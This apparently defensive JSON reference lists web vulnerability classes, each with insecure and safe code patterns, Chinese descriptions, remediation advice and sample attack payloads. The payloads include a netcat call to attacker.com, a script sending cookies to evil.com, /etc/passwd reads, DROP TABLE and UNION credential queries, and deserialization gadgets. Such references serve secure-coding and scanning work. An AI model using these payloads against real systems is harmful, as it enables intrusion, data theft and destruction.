{
  "vuln_sql_injection": {
    "title": "SQL Injection",
    "cwe_ids": ["CWE-89"],
    "owasp_ids": ["A03:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "cursor.execute(f\"SELECT...{user_input}\")", "description": "f-string SQL拼接"},
      {"lang": "python", "pattern": "cursor.execute(\"SELECT...\" + user_input)", "description": "字符串拼接SQL"},
      {"lang": "python", "pattern": "db.execute(text(f\"SELECT...{user_input}\"))", "description": "SQLAlchemy text() f-string"},
      {"lang": "php", "pattern": "mysql_query(\"SELECT...\" . $_GET['id'])", "description": "PHP直接拼接SQL"},
      {"lang": "javascript", "pattern": "db.query(`SELECT...${req.params.id}`)", "description": "Node.js模板字符串SQL"},
      {"lang": "java", "pattern": "stmt.executeQuery(\"SELECT...\" + request.getParameter(\"id\"))", "description": "Java字符串拼接SQL"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "cursor.execute(\"SELECT...WHERE id = %s\", (id,))", "description": "Python参数化查询"},
      {"lang": "php", "pattern": "$stmt = $pdo->prepare(\"SELECT...WHERE id = ?\"); $stmt->execute([$id])", "description": "PHP PDO预处理"},
      {"lang": "javascript", "pattern": "db.query('SELECT...WHERE id = $1', [id])", "description": "Node.js参数化查询"},
      {"lang": "java", "pattern": "PreparedStatement ps = conn.prepareStatement(\"SELECT...WHERE id = ?\")", "description": "Java PreparedStatement"}
    ],
    "payloads": ["' OR 1=1 --", "' UNION SELECT null,username,password FROM users --", "'; DROP TABLE users; --"],
    "remediation": "使用参数化查询/预编译语句，永远不要拼接用户输入到SQL中"
  },
  "vuln_nosql_injection": {
    "title": "NoSQL Injection",
    "cwe_ids": ["CWE-943"],
    "owasp_ids": ["A03:2021"],
    "dangerous_patterns": [
      {"lang": "javascript", "pattern": "db.collection.find({username: req.body.username})", "description": "MongoDB直接传入用户输入"},
      {"lang": "javascript", "pattern": "db.collection.find({$where: req.body.query})", "description": "$where执行任意JS"},
      {"lang": "python", "pattern": "collection.find({\"username\": user_input})", "description": "PyMongo未验证输入类型"}
    ],
    "safe_patterns": [
      {"lang": "javascript", "pattern": "const username = String(req.body.username); db.find({username})", "description": "强制转换为字符串"},
      {"lang": "javascript", "pattern": "const {username} = req.body; if (typeof username !== 'string') throw...", "description": "类型验证"}
    ],
    "payloads": ["{\"$gt\": \"\"}", "{\"$ne\": null}", "{\"$regex\": \".*\"}"],
    "remediation": "验证并强制转换输入类型为字符串，使用MongoDB操作符白名单"
  },
  "vuln_command_injection": {
    "title": "Command Injection",
    "cwe_ids": ["CWE-78"],
    "owasp_ids": ["A03:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "os.system(f\"ping {user_input}\")", "description": "os.system执行用户输入"},
      {"lang": "python", "pattern": "subprocess.call(f\"ls {user_input}\", shell=True)", "description": "shell=True拼接命令"},
      {"lang": "php", "pattern": "system(\"ls \" . $_GET['dir'])", "description": "PHP system()拼接"},
      {"lang": "php", "pattern": "exec(\"cat \" . $filename)", "description": "PHP exec()拼接"},
      {"lang": "javascript", "pattern": "child_process.exec(`ls ${userInput}`)", "description": "Node.js exec拼接"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "subprocess.run([\"ping\", user_input], shell=False)", "description": "列表形式，shell=False"},
      {"lang": "python", "pattern": "shlex.quote(user_input)", "description": "使用shlex.quote转义"},
      {"lang": "javascript", "pattern": "child_process.execFile('ls', [userInput])", "description": "execFile不使用shell"}
    ],
    "payloads": ["; cat /etc/passwd", "| nc attacker.com 4444", "$(whoami)", "`id`"],
    "remediation": "避免使用shell=True，使用列表形式传参，或使用shlex.quote转义"
  },
  "vuln_code_injection": {
    "title": "Code Injection",
    "cwe_ids": ["CWE-94"],
    "owasp_ids": ["A03:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "eval(user_input)", "description": "eval执行用户输入"},
      {"lang": "python", "pattern": "exec(user_input)", "description": "exec执行用户输入"},
      {"lang": "php", "pattern": "eval($_GET['code'])", "description": "PHP eval执行"},
      {"lang": "javascript", "pattern": "eval(userInput)", "description": "JS eval执行"},
      {"lang": "javascript", "pattern": "new Function(userInput)()", "description": "Function构造器执行"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "ast.literal_eval(user_input)", "description": "使用ast.literal_eval安全解析"},
      {"lang": "javascript", "pattern": "JSON.parse(userInput)", "description": "使用JSON.parse替代eval"}
    ],
    "payloads": ["__import__('os').system('id')", "require('child_process').exec('id')"],
    "remediation": "避免使用eval/exec，使用JSON.parse或ast.literal_eval等安全替代"
  },
  "vuln_xss": {
    "title": "Cross-Site Scripting (XSS)",
    "cwe_ids": ["CWE-79"],
    "owasp_ids": ["A03:2021"],
    "dangerous_patterns": [
      {"lang": "javascript", "pattern": "element.innerHTML = userInput", "description": "innerHTML直接赋值"},
      {"lang": "javascript", "pattern": "document.write(userInput)", "description": "document.write用户输入"},
      {"lang": "python", "pattern": "Markup(user_input)", "description": "Flask Markup未转义"},
      {"lang": "php", "pattern": "echo $_GET['input']", "description": "PHP直接输出未转义"},
      {"lang": "java", "pattern": "response.getWriter().write(userInput)", "description": "JSP直接输出"}
    ],
    "safe_patterns": [
      {"lang": "javascript", "pattern": "element.textContent = userInput", "description": "使用textContent替代innerHTML"},
      {"lang": "javascript", "pattern": "DOMPurify.sanitize(userInput)", "description": "使用DOMPurify清理HTML"},
      {"lang": "python", "pattern": "escape(user_input)", "description": "Flask escape转义"},
      {"lang": "php", "pattern": "htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8')", "description": "PHP htmlspecialchars转义"}
    ],
    "payloads": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><script>document.location='http://evil.com/?c='+document.cookie</script>"],
    "remediation": "输出到HTML时进行上下文感知的转义，使用textContent替代innerHTML"
  },
  "vuln_ssrf": {
    "title": "Server-Side Request Forgery (SSRF)",
    "cwe_ids": ["CWE-918"],
    "owasp_ids": ["A10:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "requests.get(user_input)", "description": "requests请求用户提供的URL"},
      {"lang": "python", "pattern": "urllib.request.urlopen(user_input)", "description": "urlopen用户URL"},
      {"lang": "php", "pattern": "file_get_contents($_GET['url'])", "description": "PHP读取用户URL"},
      {"lang": "java", "pattern": "new URL(userInput).openConnection()", "description": "Java URL连接"},
      {"lang": "javascript", "pattern": "axios.get(req.query.url)", "description": "Node.js请求用户URL"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "url = validate_url(user_input); requests.get(url, timeout=5)", "description": "验证URL + 超时限制"},
      {"lang": "python", "pattern": "if not url.startswith(('http://', 'https://')): raise ValueError()", "description": "协议白名单"}
    ],
    "payloads": ["http://169.254.169.254/latest/meta-data/", "http://localhost:6379/", "file:///etc/passwd", "gopher://evil.com/"],
    "remediation": "验证URL格式，使用白名单域名/协议，禁止访问内网IP，设置超时"
  },
  "vuln_path_traversal": {
    "title": "Path Traversal",
    "cwe_ids": ["CWE-22"],
    "owasp_ids": ["A01:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "open(os.path.join(base_dir, user_input))", "description": "未验证的文件路径"},
      {"lang": "php", "pattern": "include($_GET['page'])", "description": "PHP文件包含"},
      {"lang": "javascript", "pattern": "fs.readFileSync(req.params.filename)", "description": "Node.js读取用户文件"},
      {"lang": "java", "pattern": "new File(basePath + request.getParameter(\"file\"))", "description": "Java文件路径拼接"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "safe_path = os.path.realpath(os.path.join(base, filename)); if not safe_path.startswith(base): raise...", "description": "realpath验证"},
      {"lang": "javascript", "pattern": "path.join(baseDir, path.basename(filename))", "description": "使用path.basename"},
      {"lang": "php", "pattern": "basename($_GET['page'])", "description": "PHP basename过滤"}
    ],
    "payloads": ["../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
    "remediation": "使用basename过滤目录遍历，验证realpath在基础目录内"
  },
  "vuln_xxe": {
    "title": "XML External Entity (XXE)",
    "cwe_ids": ["CWE-611"],
    "owasp_ids": ["A05:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "xml.etree.ElementTree.parse(user_input)", "description": "未禁用外部实体的XML解析"},
      {"lang": "java", "pattern": "DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input)", "description": "Java默认XML解析器"},
      {"lang": "php", "pattern": "simplexml_load_string($xml)", "description": "PHP SimpleXML未禁用外部实体"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "defusedxml.ElementTree.parse(input)", "description": "使用defusedxml"},
      {"lang": "java", "pattern": "factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)", "description": "禁用DOCTYPE"}
    ],
    "payloads": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"],
    "remediation": "使用defusedxml等安全XML库，禁用DOCTYPE和外部实体"
  },
  "vuln_deserialization": {
    "title": "Insecure Deserialization",
    "cwe_ids": ["CWE-502"],
    "owasp_ids": ["A08:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "pickle.loads(user_input)", "description": "pickle反序列化不可信数据"},
      {"lang": "python", "pattern": "yaml.load(user_input)", "description": "yaml.load未使用SafeLoader"},
      {"lang": "php", "pattern": "unserialize($_COOKIE['data'])", "description": "PHP反序列化用户数据"},
      {"lang": "java", "pattern": "ObjectInputStream.readObject()", "description": "Java反序列化不可信流"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "json.loads(user_input)", "description": "使用JSON替代pickle"},
      {"lang": "python", "pattern": "yaml.safe_load(user_input)", "description": "使用yaml.safe_load"},
      {"lang": "php", "pattern": "json_decode($data, true)", "description": "使用JSON替代unserialize"}
    ],
    "payloads": ["pickle: \\x80\\x04\\x95...os.system('id')...", "yaml: !!python/object/apply:os.system ['id']"],
    "remediation": "使用JSON等安全格式，避免反序列化不可信数据"
  },
  "vuln_auth_bypass": {
    "title": "Authentication Bypass",
    "cwe_ids": ["CWE-287"],
    "owasp_ids": ["A07:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "if request.cookies.get('session') == 'admin':", "description": "客户端Cookie认证"},
      {"lang": "javascript", "pattern": "if (req.headers.authorization === 'secret')", "description": "硬编码认证密钥"},
      {"lang": "php", "pattern": "if ($_SESSION['role'] == 'admin')", "description": "可篡改的session角色"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "@login_required 或 Flask-Login current_user.is_authenticated", "description": "使用成熟的认证库"},
      {"lang": "javascript", "pattern": "jwt.verify(token, secretKey)", "description": "JWT验证"}
    ],
    "payloads": ["修改Cookie: session=admin", "JWT none算法攻击", "Session fixation"],
    "remediation": "使用成熟的认证/授权库，服务端管理会话，不信任客户端数据"
  },
  "vuln_csrf": {
    "title": "Cross-Site Request Forgery (CSRF)",
    "cwe_ids": ["CWE-352"],
    "owasp_ids": ["A01:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "@app.route('/transfer', methods=['POST']) 无CSRF保护", "description": "Flask无CSRF token"},
      {"lang": "javascript", "pattern": "app.post('/transfer', handler) 无CSRF中间件", "description": "Express无CSRF中间件"},
      {"lang": "php", "pattern": "<form method=\"POST\"> 无csrf_token", "description": "PHP表单无CSRF token"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "Flask-WTF CSRFProtect 或 @csrf_protect", "description": "Flask-WTF CSRF保护"},
      {"lang": "javascript", "pattern": "csurf() 中间件 + csrfToken()", "description": "Express csurf中间件"},
      {"lang": "php", "pattern": "<input type=\"hidden\" name=\"csrf_token\" value=\"...\">", "description": "PHP CSRF token"}
    ],
    "payloads": ["<form action=\"https://target.com/transfer\" method=\"POST\"><input type=\"hidden\" name=\"amount\" value=\"10000\"></form>"],
    "remediation": "对所有状态变更操作实施CSRF token验证"
  },
  "vuln_open_redirect": {
    "title": "Open Redirect",
    "cwe_ids": ["CWE-601"],
    "owasp_ids": ["A01:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "return redirect(request.args.get('next'))", "description": "Flask重定向用户URL"},
      {"lang": "javascript", "pattern": "res.redirect(req.query.url)", "description": "Express重定向用户URL"},
      {"lang": "php", "pattern": "header(\"Location: \" . $_GET['url'])", "description": "PHP重定向用户URL"},
      {"lang": "java", "pattern": "response.sendRedirect(request.getParameter(\"url\"))", "description": "Java重定向用户URL"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "if not url.startswith('/'): url = '/'\nreturn redirect(url)", "description": "只允许相对路径"},
      {"lang": "javascript", "pattern": "const allowed = ['/home', '/dashboard']; if (!allowed.includes(url)) url = '/home'", "description": "URL白名单"}
    ],
    "payloads": ["https://evil.com", "//evil.com", "https://target.com@evil.com"],
    "remediation": "使用URL白名单，或只允许相对路径重定向"
  },
  "vuln_race_condition": {
    "title": "Race Condition / TOCTOU",
    "cwe_ids": ["CWE-367"],
    "owasp_ids": ["A04:2021"],
    "dangerous_patterns": [
      {"lang": "python", "pattern": "if os.path.exists(path): open(path).read()", "description": "检查后使用(TOCTOU)"},
      {"lang": "python", "pattern": "if balance >= amount: withdraw(amount)", "description": "余额检查与扣款非原子操作"},
      {"lang": "javascript", "pattern": "if (await file.exists(path)) { await file.read(path) }", "description": "Node.js TOCTOU"}
    ],
    "safe_patterns": [
      {"lang": "python", "pattern": "with file_lock: ... (使用线程/进程锁)", "description": "使用锁确保原子性"},
      {"lang": "python", "pattern": "SELECT ... FOR UPDATE (数据库行锁)", "description": "数据库悲观锁"},
      {"lang": "javascript", "pattern": "使用事务或乐观锁(版本号)", "description": "事务/乐观锁"}
    ],
    "payloads": ["并发请求竞争优惠券", "TOCTOU符号链接攻击", "余额双花攻击"],
    "remediation": "使用数据库事务、文件锁或分布式锁确保操作的原子性"
  }
}
